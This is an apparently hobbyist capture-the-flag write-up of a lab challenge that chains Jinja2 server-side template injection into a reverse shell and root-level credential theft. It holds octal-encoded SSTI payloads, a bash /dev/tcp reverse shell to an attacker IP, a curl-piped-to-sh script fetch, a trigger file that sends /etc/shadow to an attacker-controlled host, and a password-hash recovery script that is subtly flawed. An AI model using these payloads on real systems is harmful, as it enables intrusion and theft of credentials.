Snowblind Ambush

Act 3, Challenge 8 | 📍 Grand Hotel Lobby | Difficulty: ❄️❄️❄️❄️❄️

Snowblind Ambush, one of the capstone challenges, demonstrates how a single unsafe template render can cascade into full system compromise. By chaining server-side template injection, command execution, and a misconfigured scheduled task, this challenge collapses from web input to root-level access.

Challenge Overview

Our goal is to stop Frost's plan starting with exploiting a web-based AI chat interface.

Entering the Challenge

The Snowblind challenge begins with the familiar GateXOR mechanism, which provisions an isolated instance of the target environment. An initial scan of the provided host revealed a single externally accessible HTTP service on port 8080 hosting a web application with an embedded AI chat interface.

Deep Dive: Nmap Scan & Service Enumeration

nmap is a powerful, open-source tool used for network discovery and security auditing. It can perform host discovery, port scanning, OS detection, and version detection. Common ports to look for include:

  • 22 (SSH) - Secure shell access
  • 80/8080 (HTTP) - Web servers
  • 443/8443 (HTTPS) - Secure web servers

Deep Dive: Reflection and Server-Side Template Injection (SSTI)

Login with the credentials from the previous step. To find injection points we need to find where we can send data to the webserver. The profile page gives us 2 opportunities: the avatar and password updates in the profile page.

After updating the password, we get redirected to a URL that has an HTML parameter, username:

http://<IP address>:8080/dashboard?username=admin

Changing the "username" parameter value from "admin" changes what's returned (reflected back) in the page:

Background Info - SSTI and Jinja Payloads

  • SSTI (Server-side template injection) (OWASP) is a web security vulnerability that occurs when an attacker can inject malicious code into a server-side template, which is then executed by the server. This happens when user input is concatenated directly into a template, rather than being passed in as safe, static data.
  • Double Curly Brackets {{ ... }} are used for expressions and variables. Anything enclosed within {{ }} will be evaluated and its result will be printed directly into the template output. This is how you display data, call functions that return values, or perform simple calculations.

Testing for SSTI Vulnerability

Knowing this application uses Flask/Jinja2, I tested with a common SSTI payload from PayloadsAllTheThings: 

{{7*7}}

The page returned 49 confirming SSTI vulnerability.

Initial SSTI testing shows that several characters are filtered, including underscores (_), which blocks direct access to internal objects like __class__ and __globals__ used in standard payloads. One of the challenge hints suggests octal encoding as a filter bypass. The underscore character (_) can be written as \137. Using octal encoding allows filtered characters to be reconstructed inside the template engine at render time.

Background Info: Bypassing Character Filters with Octal Encoding

Through systematic testing of every printable character, I identified 5 characters that were filtered and wouldn't appear in the response: <, >, x, _, and .

Why these characters?

  • < > - Prevents XSS attacks
  • _ - Blocks Python dunder methods like __class__
  • . - Prevents attribute access and path traversal
  • x - Blocks hex encoding (\x41)

Remembering the challenge hint about "eight different ones" (referring to base-8/octal), I tested whether octal encoding could bypass the character restrictions:

{{"\074\076\170\137\056"}}

This returned <>x_. showing that octal encoding bypasses all filters.

CyberChef's To Octal recipe can be used to convert characters to octal format.
Background Info - Octal

Octal (Wikipedia) is a base-8 number system that uses the digits 0 through 7. Each place value in octal represents a power of 8, unlike the decimal system which uses powers of 10.

Using this technique, along with payloads from a CTFtime write-up, it becomes possible to rebuild Python internals inside the template engine and execute arbitrary system commands. I later found other payloads that were much shorter.

Deep Dive: Exploiting SSTI for Remote Code Execution

Using a writeup for another CTF CTF time it mentions the use of Popen to execute commands via SSTI over Jinja2. Before doing this though, we need to find the reference for Popen in the subclasses like they did in the CTF time writeup. It gave the following payload to get the subclasses.

{{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}

The payload works by:

  1. ''|attr('__class__') - Get the string class
  2. |attr('__base__') - Access the base object class
  3. |attr('__subclasses__')() - List all subclasses (including subprocess.Popen)
  4. |attr('__getitem__')(419) - Select the subprocess.Popen class at index 419
  5. ('ls -la', shell=True, stdout=-1) - Execute the command and capture output
  6. |attr('communicate')() - Get stdout/stderr
  7. |attr('__getitem__')(0) - Get stdout only
  8. |attr('decode')() - Convert bytes to string

Of course, the underscores need to be escaped with \137 and browsers would automatically escape the single quotes with %27. Additionally, I discovered that the string "class" was also filtered (not just the special characters). To bypass this, I encoded one character: clas\163 where \163 is the octal for 's'. The result was the following payload to be used for the URL username parameter value: 

{{%27%27|attr(%27\137\137clas\163\137\137%27)|attr(%27\137\137base\137\137%27)|attr(%27\137\137subclas\163es\137\137%27)()}}

This payload returns a long list of subclasses with the <class 'subprocess.Popen'> was found at position 419 (with starting index 0).

Following the writeup from CTF time, I crafted the following payload to execute an "ls -la" command:

{{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(419)('ls -la',shell=True,stdout=-1)|attr('communicate')()|attr('__getitem__')(0)|attr('decode')()}}

Encoding the special restricted characters (_) and strings (class):

{{%27%27|attr(%27\137\137clas\163\137\137%27)|attr(%27\137\137base\137\137%27)|attr(%27\137\137subclas\163es\137\137%27)()|attr(%27\137\137getitem\137\137%27)(419)(%27ls%20-la%27,shell=True,stdout=-1)|attr(%27communicate%27)()|attr(%27\137\137getitem\137\137%27)(0)|attr(%27decode%27)()}}

Since HTML doesn't display carriage returns, it doesn't format the output nicely. The output can be viewed nicely using a browser's View Source or using a proxy software like Burp Proxy or ZAP.

Reverse Shell and Suspicious File Discovery

With command execution confirmed, the next step is to establish a more interactive shell for local enumeration. Using the SSTI execution primitive, a reverse shell is launched, providing a stable session on the Snowblind host.

Deep Dive: Reverse Shell

Getting a reverse shell is easier to issue commands and see output from the server.

Background Info - Reverse Shell

A reverse shell is a command-line session where the target machine is made to initiate an outbound connection back to an attacker's (or administrator's) machine, rather than the more traditional method where the attacker connects to the target. This technique is primarily used to bypass security measures like firewalls that typically restrict incoming connections but allow most outgoing traffic.

One common way to achieve this is to listen for on a port using a tool called netcat (nc) on the attacker machine. Then connect to it from the victim machine using a Bash command. (Reverse Shell Reference)

Attacker machine: nc -lvnp 4444

Victim machine: bash -c "bash -i >& /dev/tcp/<Attacker IP>/4444 0>&1"

Port 4444/tcp is a common choice for cyberattack tools like Metasploit which uses it for its default port for reverse shells.

Google Cloud has a Compute Engine with a free tier that works great for this. You will need to set up firewall rules to allow desired ports to be accessed via the internet.

Set up a listener on your attack machine:

$ nc -lvnp 4444

Now inject the reverse shell command into the username parameter. The payload contains bash -c "bash -i >& /dev/tcp/<Attacker IP>/4444 0>&1" with special characters octal-encoded: 

{{%27%27|attr(%27\137\137clas\163\137\137%27)|attr(%27\137\137base\137\137%27)|attr(%27\137\137subclas\163es\137\137%27)()|attr(%27\137\137getitem\137\137%27)(419)(%27bash+-c+%22bash+-i+\076\046+/dev/tcp/<first octet>\056<second octet>\056<third octet>\056<fourth octet>/4444+0\076\0461%22%27,shell=True,stdout=-1)|attr(%27communicate%27)()|attr(%27\137\137getitem\137\137%27)(0)|attr(%27decode%27)()}}

The reverse shell command uses several encoded characters to bypass filters:

  • \076 = > (greater than / redirect)
  • \046 = & (ampersand)
  • \056 = . (period for IP address)
  • + = space (URL encoding)
  • Replace <first octet>.<second octet>.<third octet>.<fourth octet> with your actual IP address in octal-encoded format. For example, if your IP is 192.168.1.100, it becomes: 192\056168\0561\056100

You'll know the reverse shell succeeded when you see a prompt like this in your netcat listener: 

$ nc -lvnp 4444

www-data@b66411054875:/app$

Rather than manually searching for vulnerabilities and misconfigurations, we'll use linPEAS, a popular privilege escalation enumeration script from the PEASS-ng project: 

curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

The script identifies a suspicious file:

-rwxr-xr-x 1 root root 2615 Oct 31 11:04 /var/backups/backup.py

Why This is Suspicious:

  • Owned by root but world-readable/executable - Any user can read the code and understand its functionality
  • Likely executed by a root cron job - Given it successfully accesses /etc/shadow (root-only file), it must be running with root privileges via automated scheduling
  • In /var/backups/ - Legitimate backup scripts are usually in /usr/local/bin/ or /opt/
  • Accesses /etc/shadow - Only root can read this file, confirming elevated execution context
  • Recent timestamp - Recently modified, suggesting active use

Deep Dive: Exfiltration Script Analysis

This appears to be designed for automated data exfiltration. The script performs the following operations:

  1. Trigger Detection

    2. Looks for trigger files in /dev/shm/ matching the pattern .frosty[0-9]+ (e.g., .frosty123, abc.frosty999). The filename can have any prefix, but must end with .frosty followed by one or more digits. Adding a prefix like "abc" makes the file visible (non-hidden) in directory listings, simplifying verification. 

    cmd = "ls -la /dev/shm/ | grep -E '\\.frosty[0-9]+$'"
  2. URL Extraction & Validation

    3. Reads the content of each trigger file, expecting a URL with a domain name (not just an IP address): 

    if re.match(r'^https?://[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', addr):
    Background Info - URL Validation Regex (Click to expand)

    The script validates URLs using this regex:

    ^https?://[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}

    Breaking it down:

    Pattern Meaning Example
    ^ Start of line Must begin here
    https? http or https http:// or https://
    [a-zA-Z0-9] First char must be alphanumeric a, B, 3
    [a-zA-Z0-9.-]+ Domain can have letters, numbers, dots, dashes my-site.example
    \. Literal period (escaped) .
    [a-zA-Z]{2,} TLD with 2+ letters com, org, co.uk

    Key Restriction: Because of the alpha character requirement at the end (for a TLD, top level domain), this regex requires a domain name - bare IP addresses like http://192.168.1.1 will be rejected!

  3. Target File Selection

    4. The script targets /etc/shadow for exfiltration (decoded from hex):

    exfil_file = b'\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77'.decode()  # /etc/shadow
  4. Encryption

    5. Encrypts the file using XOR with a random key and CBC-like chaining

  5. Steganography

    6. Embeds encrypted data in the blue channel of a PNG image to evade detection

  6. Exfiltration

    7. POSTs the PNG to the attacker's URL, then cleans up evidence by deleting trigger and temp files

Now that we understand how the code works, we'll weaponize it in the next step to exfiltrate /etc/shadow for ourselves!

  • Steganography to hide data in images

Abusing the Backup Script for Exfiltration

From reviewing backup.py, we learn that the script looks for a control file with a specific filename in /dev/shm. This file contains a destination URL supplied by the user. 

$ echo "http://<IP address>.nip.io:8080" > /dev/shm/foo.frosty1337

When present, the script reads the destination value and transmits the contents of /etc/shadow to that address. The data is transmitted as a URL-encoded PNG image.

Deep Dive: Exfiltration

Since the script accesses /etc/shadow), we assume it must be executed by a scheduled task or cron job running as root. We'll create a trigger file and wait for the automated process to detect and act on it. Attackers often disguise malicious scripts as legitimate backup processes. Periodic execution via cron makes the activity blend in with normal system operations.

Attack Execution Steps

  1. Set up a listener/webserver to accept POST requests. Using the same Google Cloud VM from the reverse shell step, start netcat to listen on port 8080. Don't forget to configure firewall rules to allow incoming traffic on this port. 
    $ nc -lvnp 8080
  2. Create the trigger file in /dev/shm/ with a URL containing a domain name Replace <IP address> with your VM's public IP. For example: 123.45.67.89.nip.io: 
    $ echo "http://<IP address>.nip.io:8080" > /dev/shm/foo.frosty1337
    Background Info - /dev/shm/ (Click to expand)

    /dev/shm/ is a shared memory filesystem in Linux with unique properties that make it attractive to attackers:

    • RAM-based - Stored in memory, not on disk
    • Volatile - Contents disappear on reboot (no forensic traces)
    • World-writable - Any user can create files
    • Often unmonitored - Security tools focus on disk, not RAM
    • Fast - No disk I/O overhead

    Attackers commonly use /dev/shm/ for fileless malware, staging payloads, and covert communication channels.

    Side Note - Dynamic DNS Service (Click to expand)

    We can use a dynamic DNS service because the code's regex requires a domain name (not just an IP address). Services like nip.io and sslip.io automatically resolve subdomains to IP addresses without any configuration:

    Example:
    http://192.168.1.100.nip.io → resolves to 192.168.1.100
    http://10.1.1.1.sslip.io:8080 → resolves to 10.1.1.1

Alternate Step - Python HTTP Server

Instead of netcat, you can use a Python script to automatically save the received PNG:

Python - save_exfil.py
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class ExfilHandler(BaseHTTPRequestHandler):
    # Suppress verbose logging
    def log_message(self, format, *args):
        pass

    def do_POST(self):
        # Read content length and raw body
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()

        # Extract part after equals sign
        data = post_data.split('=')[1]

        # Replace + with space and convert urlencoded data to binary
        binary_data = urllib.parse.unquote_to_bytes(data.replace('+',' '))

        # Save the PNG directly
        with open('exfiltrated.png', 'wb') as f:
            f.write(binary_data)

        print('saved')

        # Send minimal 200 OK response
        self.send_response(200)
        self.end_headers()

# Server startup (terse)
print('[*] Listening on 8080...')
HTTPServer(('0.0.0.0', 8080), ExfilHandler).serve_forever()

Run it with: python3 save_exfil.py

Now that we've exfiltrated the encrypted PNG, we need to extract and decrypt the hidden /etc/shadow file. The code encrypted the data using a custom XOR cipher and embedded it in the blue channel of the image. Our next steps are to:

Cracking the XOR-Encrypted Data

The PNG’s blue channel contains XOR-encrypted data. Although the keystream is generated at runtime, it is reused across the file, making it recoverable via a known-plaintext attack against predictable /etc/shadow fields.

XOR encryption is reversible when plaintext is known. By XORing expected /etc/shadow fields against the corresponding ciphertext bytes, the keystream can be recovered. Once recovered, the same keystream decrypts the remainder of the file.

Applying this technique reveals the root user’s password hash:

Decrypted /etc/shadow Excerpt
root:!5$cRqqIuQIhQBC5fDG$9fO47ntK6qxgZJJcvjteakPZ/Z6FiXwer5lxHrnBuC2:20392:0:99999:7:::
Deep Dive: Understanding the Cipher

The code uses a custom XOR block cipher with chaining. Here's how it works:

Cipher Properties:
  • Block size: 6 bytes
  • Key chaining: Each ciphertext block becomes the key for the next block (similar to CBC mode)
  • Operation: Simple XOR between plaintext and key
Encryption Process:
C₀ = P₀ ⊕ K₀           (first block uses initial random key)
K₁ = C₀                 (next key is previous ciphertext)
C₁ = P₁ ⊕ K₁
K₂ = C₁
C₂ = P₂ ⊕ K₂
...
Decryption Process:
P₀ = C₀ ⊕ K₀           (need to find K₀!)
K₁ = C₀                 (key for next block)
P₁ = C₁ ⊕ K₁
K₂ = C₁
P₂ = C₂ ⊕ K₂
...

The Vulnerability: While the initial key K₀ is random, /etc/shadow has a predictable format that starts with known prefixes like root:! or root:*:. We can exploit this to recover K₀ through a known-plaintext attack.

Because the XOR operation is commutative (if $A \oplus B = C$, then $A \oplus C = B$), and we know the first few bytes of a standard shadow file (the plaintext), we can XOR our guessed plaintext against the captured ciphertext. This immediately reveals the initial key ($K_0$), allowing us to unravel the entire encryption chain.

Known-Plaintext Attack

Since we know the file is /etc/shadow, we can guess the first 6 bytes (P₀) and immediately recover the initial key:

Attack Logic:
  1. Guess P₀: Try common /etc/shadow prefixes (e.g., root:!:1, root:*:$)
  2. Recover K₀: Since C₀ = P₀ ⊕ K₀, we can calculate K₀ = C₀ ⊕ P₀_guess
  3. Validate: Use K₀ to decrypt block 1: P₁ = C₁ ⊕ K₁ where K₁ = C₀
  4. Check: If P₁ contains valid shadow file characters (alphanumeric, :, $, !), the guess is correct!
  5. Decrypt: Use the verified K₀ to decrypt the entire file
Example:
If P₀ = b'root:!:1' (our guess)
And C₀ = \x52\x6f\x6f\x74... (from image)

Then: K₀ = P₀ ⊕ C₀
      K₀ = b'root:!:1' ⊕ C₀

Now decrypt P₁ to validate:
      K₁ = C₀
      P₁ = C₁ ⊕ K₁

If P₁ looks like valid text → ✓ Correct!
If P₁ is garbage → ✗ Try next guess
Background Info - Known-Plaintext Attack

A known-plaintext attack is a cryptanalysis method where the attacker has access to both the ciphertext and its corresponding plaintext. By analyzing the relationship between them, the attacker can deduce the encryption key.

In this case:

  • We know the ciphertext (encrypted bytes from the PNG)
  • We can guess the plaintext (shadow file starts predictably)
  • The cipher is XOR-based, which makes key recovery trivial once we have matching plaintext/ciphertext pairs

This attack works because:

  1. XOR is reversible: A ⊕ B = C means A = C ⊕ B
  2. Shadow files have predictable structure
  3. We only need 6 bytes of known plaintext to recover the initial key

Automated Decryption Script

I used AI assistance to create a Python script that automates this attack. The script:

  1. Extracts encrypted data - Reads every pixel from the PNG and extracts the blue channel byte
  2. Defines the cipher - Implements the same XOR block cipher used by the code
  3. Brute-forces K₀ - Tests common shadow file prefixes to find the correct initial key
  4. Validates guesses - Checks if decrypted blocks contain valid ASCII characters
  5. Decrypts the file - Once K₀ is found, decrypts the entire shadow file

Prerequisites: Install Pillow library: pip install Pillow

Side Note - Contents of decryption script
Python
from PIL import Image
import string
import os

# --- Configuration ---
BLOCK_SIZE = 6
PNG_PATH = "Act_3_snowyblind_encryptedshadow.png"

# Define the set of characters expected in a shadow file entry
# (letters, digits, colon, and common symbols like $, !, *)
# We use this to validate potential plaintext blocks P0 and P1.
VALID_SHADOW_CHARS = bytes(string.ascii_letters + string.digits + ':$!*./', 'ascii')

# --- Cryptographic Helpers ---

def crypt_block(block, key):
    """Performs the XOR operation for a single block: P = C ^ K or C = P ^ K."""
    retval = bytearray()
    for i in range(0, BLOCK_SIZE):
        retval.append(block[i] ^ key[i])
    return bytes(retval)
def decrypt_data(enc_data, initial_key):
    """
    Decrypts the entire ciphertext stream using the derived initial key.
    This implements the cipher: P_i = C_i ^ K_i where K_(i+1) = C_i.
    """
    block_count = len(enc_data) // BLOCK_SIZE
    decrypted_data = bytearray()

    currKey = initial_key # K0 is the initial_key

    for i in range(block_count):
        # 1. Get the current ciphertext block Ci
        start = i * BLOCK_SIZE
        end = start + BLOCK_SIZE
        C_i = enc_data[start:end]

        # 2. Decrypt to get the plaintext block Pi: Pi = Ci ^ Ki
        P_i = crypt_block(C_i, currKey)
        decrypted_data += P_i

        # 3. Update the key for the next block: K(i+1) = Ci
        currKey = C_i

    return bytes(decrypted_data)

# --- Image Processing ---

def extract_encrypted_data_from_png(png_path):
    """Loads a PNG file and extracts the encrypted data from the blue channel."""
    if not os.path.exists(png_path):
        print(f"Error: PNG file not found at {png_path}")
        return None

    img = Image.open(png_path)
    width, height = img.size
    enc_data_list = []

    # Iterate over pixels row by row
    for y in range(height):
        for x in range(width):
            # The original script saves the encrypted byte 'b' as (0, 0, b)
            r, g, b = img.getpixel((x, y))
            encrypted_byte = b
            enc_data_list.append(encrypted_byte)

    # Convert the list of bytes back into a bytes object (ciphertext C)
    return bytes(enc_data_list)

# --- Smart Brute-Force Key Recovery ---

def is_valid_shadow_block(block):
    """Checks if a 6-byte block is composed only of characters expected in /etc/shadow (ASCII text)."""
    if len(block) != BLOCK_SIZE:
        return False
    # Check if all bytes are in the set of VALID_SHADOW_CHARS
    return all(b in VALID_SHADOW_CHARS for b in block)

def smart_bruteforce_key_and_decrypt(enc_data, crypt_block_func, decrypt_data_func):
    """Tests common P0 prefixes to find the correct initial key K0."""
    C0 = enc_data[0:BLOCK_SIZE]
    C1 = enc_data[BLOCK_SIZE:BLOCK_SIZE*2]

    # List of highly likely 6-byte P0 prefixes for /etc/shadow
    possible_p0s = [
        b'root:!:1', # root, locked, start of timestamp
        b'root:*:$', # root, disabled, start of hash (most common for CTF placeholders)
        b'user:x:$', # generic user, placeholder, start of hash
        b'admin:!',  # common admin user
        b'groot:!', # CTF-specific user (6 chars)
    ]

    print(f"Starting smart brute-force check on {len(possible_p0s)} prefixes...")

    for P0_candidate in possible_p0s:
        # 1. Recover the initial key K0: K0 = P0_candidate ^ C0
        K0_candidate = crypt_block_func(P0_candidate, C0)

        # 2. Decrypt the second block P1: P1 = C1 ^ K1. K1 is always C0.
        P1_decrypted = crypt_block_func(C1, C0)

        # 3. Check if both the first and second blocks are valid ASCII
        # P0 is guaranteed to be valid if P0_candidate is, but checking P1 is the true test.
        if is_valid_shadow_block(P1_decrypted):
            print(f"🎉 SUCCESS! Likely P0 found: {P0_candidate.decode('ascii', errors='ignore')}")

            # Use the verified K0 to decrypt the entire file
            full_shadow = decrypt_data_func(enc_data, K0_candidate)

            # Remove trailing \x00 padding bytes and return as a string
            return full_shadow.rstrip(b'\x00').decode('ascii', errors='ignore')

    return "❌ FAILED to find a matching P0 prefix. Try extending the list of candidates."

# --- Main Execution ---

if __name__ == "__main__":
    enc_data = extract_encrypted_data_from_png(PNG_PATH)

    if enc_data and len(enc_data) >= BLOCK_SIZE * 2:
        final_shadow_content = smart_bruteforce_key_and_decrypt(
            enc_data,
            crypt_block,
            decrypt_data
        )

        if "FAILED" not in final_shadow_content:
            print("\n" + "="*40)
            print("🚀 Recovered Shadow Content:")
            print("="*40)
            print(final_shadow_content)
            print("="*40)
        else:
            print(final_shadow_content)
            print("\nHint: The correct P0 prefix might not be in the list. Check for CTF-specific usernames.")
    elif enc_data:
        print("Error: Encrypted data is too short to perform key recovery (needs at least 12 bytes).")

Background Info - Shadow file and Salting
Shadow File Format

The /etc/shadow file stores encrypted passwords with this structure:

username:[lock]$algorithm$salt$hash:last_change:min:max:warn:inactive:expire
Field Example Meaning
username root Account name
[lock] ! ! or * to designate locked or disabled state
algorithm 5 1 is MD5, 5 is SHA256 Crypt, 6 is SHA512 Crypt
salt cRqqIu... random data added to passwords before hashing
Hash 9fO47n... Encrypted password (SHA256 Crypt)
Last change 20392 Days since 1970-01-01 of last password change
Min/Max/Warn 0:99999:7 Password aging policies

More info on /etc/shadow.

What is Salting?

A salt is random data added to passwords before hashing. This prevents:

  • Rainbow table attacks (Wikipedia) - Pre-computed hash lookups like CrackStation
  • Identical password detection - Same password → different hash (due to different salts)

Even with salting, weak passwords can still be cracked through dictionary attacks.

Background Info - Dictionary Attacks
Dictionary Attacks

A dictionary attack tries millions of common passwords from a wordlist. For each candidate password:

  1. Combine password with the known salt
  2. Hash using the algorithm ($5$ = SHA-256)
  3. Compare result with the target hash
  4. If match → password found!
John the Ripper

John the Ripper (often called "John") is a popular open-source password cracking tool that supports:

  • Multiple hash algorithms (MD5, SHA-256, bcrypt, etc.)
  • Dictionary attacks with wordlists
  • Brute-force attacks
  • Rule-based password mutations
rockyou.txt Wordlist

rockyou.txt is a famous password wordlist containing 14+ million real-world passwords leaked from the RockYou social media company in 2009. It's widely used for penetration testing and is included by default in Kali Linux.

  • Size: ~134 MB, 14 million passwords
  • Updated versions: rockyou2021.txt, rockyou2024.txt (billions of passwords)
  • Why it works: Contains common passwords, patterns, and leaked credentials

Side Note - SHA256-crypt vs SHA256

One important distinction I learned during this challenge: SHA256-crypt (used for Linux passwords) is different from standard SHA256 hashing. While both use the SHA-256 algorithm internally, SHA256-crypt was specifically designed for password security with these key differences:

  • Multiple rounds: Defaults to 5,000 iterations (configurable up to 999,999,999)
  • Complex algorithm: Involves salting, multiple hashing passes, and bit shuffling
  • Intentionally slow: Makes brute-force attacks computationally expensive

This means you cannot use the sha256sum command to calculate SHA256-crypt hashes - you need specialized tools that implement the full SHA-crypt specification.
